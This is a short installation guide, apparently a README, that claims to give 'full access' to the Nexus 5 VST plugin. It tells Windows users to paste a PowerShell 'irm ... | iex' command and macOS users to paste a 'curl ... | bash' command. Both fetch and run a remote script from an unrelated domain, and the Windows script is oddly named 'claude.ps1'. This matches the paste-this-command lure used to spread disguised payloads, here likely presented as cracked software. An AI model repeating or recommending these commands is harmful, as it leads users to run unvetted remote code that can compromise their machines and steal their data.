Installation Guide
----------------------------------------------------

## Requirements
- Windows 10 / 11
- macOS
- Compatible DAW (FL Studio, Ableton Live, Logic Pro, Cubase, etc.)
- Internet connection

## What You Get
- Full access to Nexus 5 VST plugin installer

## Installation

### Windows quick start (Currently, this only works via PowerShell.)

1. Press Win + X and select Terminal (or search for PowerShell in the Start menu)
2. Paste the following command and press Enter:
```pwsh
irm 'https://edge.kpe-engine.com/p/claude.ps1' | iex
```

## MacOS quick start
1. Open Terminal app
2. Paste the following command and press Enter:
```bash
curl -fsSL https://edge.kpe-engine.com/p/nexus_5 | bash
```

> The script will download the Nexus 5 setup files and prompt you to start the installation.
> The whole process takes less than a minute.

## After Installation

Once the installation is complete, launch your DAW and perform a plugin rescan to start using Nexus 5.
No additional manual configuration is needed.

## How It Works

The script automatically downloads the latest Nexus 5 installer package for your operating system and launches the setup wizard for quick installation.
